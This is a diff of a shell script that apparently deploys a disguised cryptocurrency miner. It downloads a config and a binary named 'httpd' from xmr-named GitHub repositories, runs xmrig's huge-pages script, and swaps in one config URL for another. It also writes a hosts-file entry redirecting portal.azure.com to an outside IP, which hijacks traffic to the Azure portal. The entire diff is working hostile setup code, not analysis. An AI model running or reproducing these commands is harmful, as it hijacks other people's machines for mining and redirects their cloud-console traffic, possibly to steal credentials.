@@ -4,7 +4,7 @@ sudo apt-get install msr-tools build-essential cmake libuv1-dev libssl-dev libhw
 sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
 sudo wget https://github.com/minnie1311/xmrorge/raw/master/httpd
 sudo rm config.json
-sudo wget https://raw.githubusercontent.com/evilbabylx/script/master/config.json
+sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
 sudo chmod +x azu
 sudo -- sh -c "echo '103.145.255.41  portal.azure.com' >> /etc/hosts"
 wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
